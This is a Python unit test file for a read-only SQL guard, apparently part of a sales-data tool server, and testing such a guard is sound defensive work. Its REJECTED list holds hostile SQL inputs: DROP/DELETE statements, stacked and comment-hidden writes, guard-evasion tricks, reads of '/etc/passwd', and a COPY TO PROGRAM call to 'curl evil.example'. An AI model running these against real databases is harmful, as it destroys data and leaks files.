"""Unit tests for the SELECT-only guard (no database needed)."""

from __future__ import annotations

import pytest

from salestalk_mcp.sql_guard import (
    MAX_SQL_LENGTH,
    SqlGuardError,
    guard_sql,
    strip_comments,
    tokenize,
    wrap_with_limit,
)

# --------------------------------------------------------------------------- allowed

ALLOWED = [
    "SELECT 1",
    "select * from orders",
    "  SELECT count(*) FROM orders;  ",
    "SELECT * FROM orders;\n-- trailing comment",
    "WITH m AS (SELECT date_trunc('month', order_date) AS m, sum(total_amount) AS r FROM orders GROUP BY 1) "
    "SELECT * FROM m",
    "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t WHERE n < 5) SELECT n FROM t",
    "(SELECT 1) UNION ALL (SELECT 2)",
    "SELECT name FROM customers WHERE name = 'DROP TABLE orders'",  # keyword inside a string
    "SELECT 'it''s; fine' AS s",  # escaped quote and semicolon inside a string
    "SELECT $$ delete from x; $$ AS body",  # dollar-quoted string
    "SELECT $tag$ insert into y $tag$ AS body",
    'SELECT "update" FROM (SELECT 1 AS "update") q',  # quoted identifier that looks like a keyword
    "SELECT * FROM orders ORDER BY order_date DESC FETCH FIRST 5 ROWS ONLY",
    "SELECT substring('abcdef' FROM 2 FOR 3)",  # FOR followed by a number, not a lock clause
    "SELECT customer_id, total_amount, created_at, updated_by_name FROM orders",  # words containing keywords
    "SELECT * FROM orders WHERE status <> 'cancelled' /* comment ; DROP */ LIMIT 5",
    "SELECT E'it\\'s' AS escaped",  # E'' string with backslash-escaped quote
    "SELECT * FROM v_sales WHERE city = 'Dubai' AND order_date >= CURRENT_DATE - 30",
    "SELECT p.category, sum(revenue) FROM v_sales p GROUP BY ROLLUP (p.category)",
    "SELECT count(*) FILTER (WHERE status = 'returned') FROM orders",
    "SELECT * FROM orders WHERE customer_id = ANY (ARRAY[1, 2, 3])",
    "SELECT 1 /* nested /* comment */ still comment */",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_allowed_queries_pass(sql: str) -> None:
    guarded = guard_sql(sql)
    assert guarded.sql
    assert not guarded.sql.rstrip().endswith(";")


def test_comments_are_stripped_from_executed_sql() -> None:
    guarded = guard_sql("SELECT 1 -- hello\n/* block */ AS x;")
    assert guarded.sql == "SELECT 1 AS x"


def test_string_literals_are_preserved_exactly() -> None:
    guarded = guard_sql("SELECT 'a  --  b /* c */' AS s")
    assert "'a  --  b /* c */'" in guarded.sql


def test_strip_comments_helper() -> None:
    assert strip_comments("SELECT 1 -- x\n, 2 /* y */") == "SELECT 1 , 2"


# --------------------------------------------------------------------------- rejected

REJECTED = {
    # empty / not a SELECT
    "empty": "",
    "whitespace": "   \n\t ",
    "only comment": "-- just a comment",
    "only semicolon": ";",
    "insert": "INSERT INTO cities VALUES (9, 'X', 'Y', 'ZZ')",
    "update": "UPDATE products SET unit_price = 0",
    "delete": "DELETE FROM orders",
    "drop": "DROP TABLE orders",
    "truncate": "TRUNCATE orders",
    "alter": "ALTER TABLE orders ADD COLUMN x int",
    "create": "CREATE TABLE x (i int)",
    "grant": "GRANT ALL ON orders TO public",
    "revoke": "REVOKE SELECT ON orders FROM salestalk_ro",
    "copy to program": "COPY orders TO PROGRAM 'curl evil.example'",
    "explain analyze delete": "EXPLAIN ANALYZE DELETE FROM orders",
    "values": "VALUES (1)",
    "table": "TABLE orders",
    "show": "SHOW ALL",
    "set": "SET statement_timeout = 0",
    "begin": "BEGIN; DELETE FROM orders; COMMIT",
    "do block": "DO $$ BEGIN DELETE FROM orders; END $$",
    "call": "CALL do_something()",
    "vacuum": "VACUUM FULL",
    # stacked statements
    "stacked delete": "SELECT 1; DELETE FROM orders",
    "stacked drop": "SELECT * FROM orders; DROP TABLE orders;",
    "stacked select": "SELECT 1; SELECT 2",
    "stacked after comment": "SELECT 1 -- hi\n; DROP TABLE x",
    "semicolon in block comment hides nothing": "SELECT 1 /* ; */ ; DELETE FROM orders",
    # writes hidden inside a SELECT
    "data-modifying CTE": "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
    "cte insert": "WITH x AS (INSERT INTO cities VALUES (5,'a','b','cc') RETURNING 1) SELECT * FROM x",
    "select into": "SELECT * INTO orders_copy FROM orders",
    "for update": "SELECT * FROM orders FOR UPDATE",
    "for share": "SELECT * FROM orders FOR SHARE",
    "for no key update": "SELECT * FROM orders FOR NO KEY UPDATE",
    "for key share": "SELECT * FROM orders FOR KEY SHARE",
    # comment tricks
    "keyword after comment": "/* harmless */ DELETE FROM orders",
    "line comment then write": "-- SELECT\nDELETE FROM orders",
    "select hidden in comment": "/* SELECT */ UPDATE orders SET status = 'x'",
    "unterminated block comment": "SELECT 1 /* never closed",
    "unterminated string": "SELECT 'oops",
    "unterminated dollar quote": "SELECT $$ oops",
    "unterminated identifier": 'SELECT "oops',
    # dangerous functions
    "pg_sleep": "SELECT pg_sleep(60)",
    "pg_sleep uppercase": "SELECT PG_SLEEP(60)",
    "pg_sleep schema-qualified": "SELECT pg_catalog.pg_sleep(60)",
    "pg_sleep quoted": 'SELECT "pg_sleep"(60)',
    "pg_sleep unicode-escaped": 'SELECT U&"pg_sl\\0065ep"(60)',
    "pg_sleep from clause": "SELECT * FROM pg_sleep(10)",
    "pg_read_file": "SELECT pg_read_file('/etc/passwd')",
    "pg_ls_dir": "SELECT pg_ls_dir('.')",
    "lo_import": "SELECT lo_import('/etc/passwd')",
    "dblink": "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)",
    "set_config": "SELECT set_config('statement_timeout', '0', false)",
    "nextval": "SELECT nextval('some_seq')",
    "terminate backend": "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
    "advisory lock": "SELECT pg_advisory_lock(1)",
    "query_to_xml dynamic sql": "SELECT query_to_xml('delete from orders', true, true, '')",
    "pg_notify": "SELECT pg_notify('ch', 'x')",
    "uescape": "SELECT U&'d!0061t!+000061' UESCAPE '!' AS x",
    # misc
    "nul byte": "SELECT 1\x00",
}


@pytest.mark.parametrize("sql", list(REJECTED.values()), ids=list(REJECTED.keys()))
def test_malicious_or_invalid_queries_are_rejected(sql: str) -> None:
    with pytest.raises(SqlGuardError):
        guard_sql(sql)


def test_too_long_query_rejected() -> None:
    sql = "SELECT " + ", ".join(["1"] * (MAX_SQL_LENGTH // 2))
    with pytest.raises(SqlGuardError, match="too long"):
        guard_sql(sql)


def test_non_string_rejected() -> None:
    with pytest.raises(SqlGuardError):
        guard_sql(None)  # type: ignore[arg-type]


def test_error_messages_are_helpful() -> None:
    with pytest.raises(SqlGuardError, match="DELETE"):
        guard_sql("WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d")
    with pytest.raises(SqlGuardError, match="single statement"):
        guard_sql("SELECT 1; SELECT 2")
    with pytest.raises(SqlGuardError, match="Only SELECT"):
        guard_sql("UPDATE orders SET status = 'x'")


# --------------------------------------------------------------------------- lexer + limit


def test_tokenizer_classifies_tokens() -> None:
    kinds = [(t.kind, t.text) for t in tokenize("SELECT 'a' AS \"b\", $1 FROM t") if t.kind != "space"]
    assert ("word", "SELECT") in kinds
    assert ("string", "'a'") in kinds
    assert ("quoted_ident", "b") in kinds
    assert ("symbol", "$1") in kinds


def test_unicode_identifier_is_decoded() -> None:
    tokens = [t for t in tokenize('SELECT U&"d\\0061ta"') if t.kind == "quoted_ident"]
    assert tokens[0].text == "data"


def test_wrap_with_limit_caps_rows() -> None:
    wrapped = wrap_with_limit("SELECT * FROM orders LIMIT 100000", 50)
    assert wrapped.startswith("SELECT * FROM (")
    assert wrapped.endswith("LIMIT 50")


def test_wrap_with_limit_rejects_bad_limit() -> None:
    with pytest.raises(ValueError):
        wrap_with_limit("SELECT 1", 0)
